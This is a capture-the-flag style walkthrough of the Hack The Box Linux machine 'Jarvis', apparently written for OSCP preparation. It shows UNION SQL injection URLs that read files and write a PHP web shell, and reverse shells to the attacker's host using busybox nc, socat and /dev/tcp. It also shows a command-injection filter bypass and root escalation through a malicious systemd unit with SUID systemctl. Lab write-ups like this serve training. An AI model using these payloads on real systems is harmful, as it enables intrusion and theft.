---
title: Jarvis
date: 2025-05-28
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, Linux, SQLi, UNION-ORDER-BY-injection, SQLi-file-write, command-injection, systemctl-suid-privesc ] 
image: jarvis.png
media_subpath: /assets/img/posts/2025-05-28-jarvisHTB/
---

## Introduction

In this walkthrough, I tackled *Jarvis*, a medium-difficulty Linux machine. It starts with a web server that includes DoS and brute-force protection mechanisms. By identifying a manually exploitable SQL injection vulnerability, I was able to upload a web shell for initial access. With limited privileges, I discovered that the `www` user could execute a script as another user, which was vulnerable to command injection—allowing me to escalate privileges. Deeper enumeration revealed that `systemctl` had the SUID bit set, and I leveraged this misconfiguration to obtain a root shell.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

![image.png](image%202.png)

## Services

### Port 22

Version - OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)

We usually skip SSH.

## Web

### Port 80

Version - Apache httpd 2.4.25 ((Debian))

**Gobuster Scan**

![image.png](image%203.png)

### Port 64999

Nothing here.

## Exploitation

Checking for room.php we see it gets a number from the user and displays that room. 

![image.png](image%204.png)

Let’s check for SQLi.

![image.png](image%205.png)

By putting `6'-- //` image is not returned, let’s also try without quote 

![image.png](image%206.png)

Without a quote it worked that means parameter expects integer.

I tried to find number of columns with `ORDER BY` , it will always return success till first fail happens and it cannot find column to sort referring to that column. After number 7 it does not return an image, so we can infer that number of columns is 7.

I tried getting information about database version and our current user, but it didn’t return any results in any injection points(null), so I changed a valid parameter value to invalid one so that it does not override our injected values.

- **Version and current user**
    
    `http://10.10.10.143/room.php?cod=-1 union select null,null,system_user(),null,version(),null,null -- //`
    
    ![image.png](image%207.png)
    
    Now it returned results.
    
- **Listing databases**
    
    `http://10.10.10.143/room.php?cod=-1 union select null,null,null,null,SCHEMA_NAME,null,null FROM INFORMATION_SCHEMA.SCHEMATA;-- //`  - returns information about databases.
    
    ![image.png](image%208.png)
    
- **Listing tables in database**
    
    `http://10.10.10.143/room.php?cod=-1 union select null,TABLE_NAME,null,null,null,TABLE_SCHEMA,null FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='hotel' -- //`
    
    ![image.png](image%209.png)
    
- **Listing columns**
    
    `http://10.10.10.143/room.php?cod=-1 union select null,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,null,null,null FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='room' -- //`
    
    ![image.png](image%2010.png)
    
    cod column of room table of hotel database.
    
- **Dumping data**
    
    `http://10.10.10.143/room.php?cod=-1 union select null,cod,null,null,null,null,null FROM hotel.room -- //`
    
    Reading the column I suppose we can just read valid cod numbers that we already checked and no use from them for us.
    
    ![image.png](image%2011.png)
    

As we are Database Admin we should be able to write and read data, we already encountered phpmyadmin I am gonna try to read its credentials from config file.

- Reading files
    
    Testing for super admin privileges we see that we have privileges
    
    `http://10.10.10.143/room.php?cod=-1 union select null,super_priv,null,null,null,null,null FROM mysql.user-- //`
    
    ![image.png](image%2012.png)
    
    `http://10.10.10.143/room.php?cod=-1 union select null,load_file("/etc/passwd"),null,null,null,null,null -- //`
    
    ![image.png](image%2013.png)
    
- **Writing files**
    
    The [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, `NULL` means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the `FILE` privilege. 
    
    `http://10.10.10.143/room.php?cod=-1 union select null,variable_name,variable_value,null,null,null,null FROM information_schema.global_variables where variable_name="secure_file_priv" -- //`
    
    ![image.png](image%2014.png)
    
    Variable is empty, that means we can read and write to any directory that are in our shell user privileges.
    
    `http://10.10.10.143/room.php?cod=-1 union select null,"<?php system($_GET['cmd']);?>",null,null,null,null,null INTO OUTFILE "/var/www/html/webshell.php"-- //`
    
    ![image.png](image%2015.png)
    

That’s it writing worked, now I am gonna try to get a reverse shell.

I found out that target contains busybox and used it to get a reverse shell:

```bash
busybox nc 10.10.14.12 443 -e /bin/bash
```

Now we have a shell let’s make it interactive:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")’
```

![image.png](image%2016.png)

Checking `connection.php` I found database credentials:

![image.png](image%2017.png)

But nothing interesting identified inside. I used same password `pepper` user but it didn’t work.

## Credentials

```bash
DBadmin : imissyou
```

## Lateral Movement

Checking sudo privileges I see that I can execute `/var/www/Admin-Utilities/simpler.py` as pepper without password.

I found that we have socat installed let’s make a shell fully interactive:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444 #on Kali
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.12:4444 # on victim machine
```

I found a script called `simpler.py` under `/var/www/Admin-Utilities` and it has 3 functions, 

- `-s` prints statistics about the attacker, most risky attack,
- `-l` prints attacker IP
- `-p` pings the attacker

I noticed ping here and inspecting the source code I see performs ping request to provided IP address

```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

but it restricts the usage of characters that cause command injection, but one is missing here `sub-shell`.

We can execute command using `$(command)` and it is not prevented by the script.

I am gonna write a reverse shell script in a `.sh` because `-` is blocked and then execute the script.

```bash
#! /bin/bash

busybox nc 10.10.14.12 4445 -e /bin/bash
```

```bash
10.10.14.12$(/tmp/script.sh)
```

![image.png](image%2018.png)

You can make the shell persistent using same method with `socat`.

## Privilege Escalation

- **OSCP Checklist**
    - [ ]  Situational awareness
    - [ ]  Exposed Confidential Information
    - [ ]  Password Authentication Abuse
    - [ ]  Hunting Sensitive Information
    - [ ]  Sudo
    - [ ]  SUID/SGID
    - [ ]  Capabilities
    - [ ]  Cron Jobs Abuse
    - [ ]  Kernel Exploits
    - [ ]  **Check if sudoers file is writable**
    - [ ]  Try credentials you already obtained for various services admin roles
    

Checking for `SUID` bits set I see `systemctl`:

```bash
find / -perm -u=s -type f 2>/dev/null
```

![image.png](image%2019.png)

[GTFOBins-systemctl-SUID](https://gtfobins.github.io/gtfobins/systemctl/#suid)

For some reason exact methodology didn’t work for me here, I created `mine.service` under `/home/pepper` directory with content:

```bash
#On attacker machine
1. echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/6666 0>&1'
[Install]
WantedBy=multi-user.target' > attacker.service

#On target
2. wget http://10.10.14.12/attacker.service -O /home/pepper/mine.service

3. TF=/home/pepper/mine.service

4. systemctl link $TF

5. systemctl enable --now $TF
```

![image.png](image%2020.png)

Now we are root!

## Mitigation

- Apply input validation and use parameterized queries to prevent SQL injection.
- Restrict web shell upload paths and enforce proper file permissions.
- Avoid using SUID on powerful binaries like `systemctl`.
- Review `sudo` and script execution permissions to prevent privilege escalation.
- Regularly audit the system for insecure file permissions and configurations.
